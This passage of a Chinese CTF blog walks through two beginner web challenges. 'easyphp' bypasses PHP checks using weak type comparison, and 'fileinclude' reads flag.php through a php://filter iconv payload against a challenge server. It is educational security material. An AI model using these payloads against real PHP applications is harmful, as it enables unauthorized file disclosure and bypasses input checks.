<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$c=(array)json_decode(@$_GET[&#x27;c&#x27;]);</span><br><span class="line">//json_decode函数用于将JSON字符串解码为PHP对象或数组。</span><br><span class="line">//@是一个错误控制运算符，它会抑制错误消息的显示。</span><br><span class="line">//(array)是一个类型转换，确保解码后的结果是数组，而不是对象。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_array($c) &amp;&amp; !is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022)</span><br><span class="line">//m不是数字，且m与2022相比，m更大，基于php中的弱类型比较特性，m的值应为：比2022更大的数+字母（如2023z)</span><br><span class="line">&#123;</span><br><span class="line">    if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))</span><br><span class="line">    //这里要求n为数组，只有两个元素，且第一个为数组，出现了@，其实是暗示了弱类型比较的使用</span><br><span class="line">    &#123;</span><br><span class="line">        $d = array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);</span><br><span class="line">        $d === false?die(&quot;no...&quot;):NULL;</span><br><span class="line">        foreach($c[&quot;n&quot;] as $key=&gt;$val)&#123;</span><br><span class="line">            $val===&quot;DGGJ&quot;?die(&quot;no......&quot;):NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        $key2 = 1;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;no hack&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;no&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>array_search函数会搜索n中的元素，若元素值为”DGGJ”,则会返回其所对应的键名</p>
<p>foreach($c[“n”] as $key&#x3D;&gt;$val)<code>的作用是遍历数组</code>$c[“n”]<code>中的每个元素。在每次循环迭代中，它都会取出</code>$c[“n”]<code>的一个元素，并把这个元素的键赋值给变量</code>$key<code>，把这个元素的值赋值给变量 </code>$val，如果 <code>$c[&quot;n&quot;]</code> 数组中的任何元素包含 <code>&quot;DGGJ&quot;</code>，那么这可能表示输入数据不符合预期，因此脚本会输出错误信息并停止执行。</p>
<p>因此需要绕过其中一个函数</p>
<p>由于在php中，当字符与数字进行比较时，字符会自动转化为0(php的弱类型比较)</p>
<p>所以我们只需要让n中的第二个值为大于0的数字即可</p>
<p>所以给出payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=7e6&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;2023x&quot;,&quot;n&quot;:[[],0]&#125;</span><br></pre></td></tr></table></figure>





<h1 id="fileinclude-1"><a href="#fileinclude-1" class="headerlink" title="fileinclude"></a>fileinclude</h1><p><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/image-20240330190132876.png" alt="image-20240330190132876"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">    include(&quot;./check.php&quot;);</span><br><span class="line">    if(isset($_GET[&#x27;filename&#x27;]))&#123;</span><br><span class="line">        $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">        include($filename);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42789937/article/details/128063361">https://blog.csdn.net/weixin_42789937/article/details/128063361</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:58114/?filename=php://filter/convert.iconv.utf8.utf16/resource=flag.php</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://linlimei.top">linlimei</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://linlimei.top/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%96%B0%E6%89%8B-%E5%BC%95%E5%AF%BC%E6%A8%A1%E5%BC%8F/cyberpeace_easy/">https://linlimei.top/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%96%B0%E6%89%8B-%E5%BC%95%E5%AF%BC%E6%A8%A1%E5%BC%8F/cyberpeace_easy/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://linlimei.top" target="_blank">linlimei</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a></div><div class="post_share"><div class="social-share" data-image="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/IMG_20231116_150737.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/ctfshow/web%E5%85%A5%E9%97%A8/ctfshow/" title="ctfshow"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ctfshow</div></div></a></div><div class="next-post pull-right"><a href="/%E8%AF%AD%E8%A8%80/C%E8%AF%AD%E8%A8%80/C/" title="C语言"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">C语言</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://skymirror-1322371846.cos.ap-beijing.myqcloud.com/IMG_20231116_150737.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">linlimei</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easyupload"><span class="toc-number">1.</span> <span class="toc-text">easyupload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">题目信息：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">解题过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">知识点：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fileinclude"><span class="toc-number">2.</span> <span class="toc-text">fileinclude</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">题目：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A-1"><span class="toc-number">2.2.</span> <span class="toc-text">解题过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-1"><span class="toc-number">2.3.</span> <span class="toc-text">知识点：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Inget"><span class="toc-number">3.</span> <span class="toc-text">Inget</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP2"><span class="toc-number">4.</span> <span class="toc-text">PHP2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fileclude"><span class="toc-number">5.</span> <span class="toc-text">fileclude</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A-1"><span class="toc-number">5.1.</span> <span class="toc-text">题目：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">5.2.</span> <span class="toc-text">知识点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyphp"><span class="toc-number">6.</span> <span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Newscenter"><span class="toc-number">7.</span> <span class="toc-text">Newscenter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A-2"><span class="toc-number">7.1.</span> <span class="toc-text">题目：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A-2"><span class="toc-number">7.2.</span> <span class="toc-text">解题过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="toc-number">7.3.</span> <span class="toc-text">知识点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#command-execution"><span class="toc-number">8.</span> <span class="toc-text">command execution</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A-3"><span class="toc-number">8.1.</span> <span class="toc-text">解题过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-2"><span class="toc-number">8.2.</span> <span class="toc-text">知识点：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xff-referer"><span class="toc-number">9.</span> <span class="toc-text">xff-referer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">9.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">9.2.</span> <span class="toc-text">解题过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-3"><span class="toc-number">9.3.</span> <span class="toc-text">知识点：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unserialize3"><span class="toc-number">10.</span> <span class="toc-text">unserialize3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">10.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B-1"><span class="toc-number">10.2.</span> <span class="toc-text">解题过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-4"><span class="toc-number">10.3.</span> <span class="toc-text">知识点：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#upload1"><span class="toc-number">11.</span> <span class="toc-text">upload1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A-3"><span class="toc-number">11.1.</span> <span class="toc-text">题目：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A-4"><span class="toc-number">11.2.</span> <span class="toc-text">解题过程：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-php-include"><span class="toc-number">12.</span> <span class="toc-text">web_php_include</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A-4"><span class="toc-number">12.1.</span> <span class="toc-text">题目：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A-5"><span class="toc-number">12.2.</span> <span class="toc-text">解题过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-5"><span class="toc-number">12.3.</span> <span class="toc-text">知识点：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-rce"><span class="toc-number">13.</span> <span class="toc-text">php_rce</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="toc-number">13.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A-6"><span class="toc-number">13.2.</span> <span class="toc-text">解题过程：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#warmup"><span class="toc-number">14.</span> <span class="toc-text">warmup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A-5"><span class="toc-number">14.1.</span> <span class="toc-text">题目：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%EF%BC%9A-7"><span class="toc-number">14.2.</span> <span class="toc-text">解题过程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-6"><span class="toc-number">14.3.</span> <span class="toc-text">知识点：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyphp-1"><span class="toc-number">15.</span> <span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fileinclude-1"><span class="toc-number">16.</span> <span class="toc-text">fileinclude</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/PHPminglinggbuhuixian/" title="PHP命令执行不回显">PHP命令执行不回显</a><time datetime="2024-05-27T06:42:13.972Z" title="发表于 2024-05-27 14:42:13">2024-05-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/web/ssti_learning'/" title="ssti">ssti</a><time datetime="2024-05-17T13:47:04.022Z" title="发表于 2024-05-17 21:47:04">2024-05-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%B7%A5%E5%85%B7/kali_with_reset/" title="记一次kali重装">记一次kali重装</a><time datetime="2024-05-17T07:54:14.793Z" title="发表于 2024-05-17 15:54:14">2024-05-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/uncategorized/history_of_history/" title="无题">无题</a><time datetime="2024-04-29T13:59:46.316Z" title="发表于 2024-04-29 21:59:46">2024-04-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/uncategorized/phpunserialize/" title="无题">无题</a><time datetime="2024-03-31T10:39:54.313Z" title="发表于 2024-03-31 18:39:54">2024-03-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By linlimei</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>